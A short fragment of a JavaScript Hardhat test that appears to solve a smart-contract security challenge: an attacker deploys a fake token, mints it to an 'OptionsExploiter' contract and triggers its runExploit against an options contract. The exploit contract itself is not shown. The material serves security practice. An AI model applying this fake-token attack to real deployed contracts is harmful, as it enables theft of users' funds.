...
it("solves the challenge", async function () {
  ...
  let fakeFactory = await ethers.getContractFactory('Token')
  let fake = await fakeFactory.connect(attacker).deploy('Fs','Fs')

  let exploiterFactory = await ethers.getContractFactory('OptionsExploiter')
  ...
  await fake.connect(attacker).mintPerUser(
    [await exploiter.address],[precision.mul(2_101)]
  )

  let optionId = await optionsContract.connect(attacker).getLatestOptionId()
  await exploiter.connect(attacker).runExploit(precision.mul(2_101),optionId)
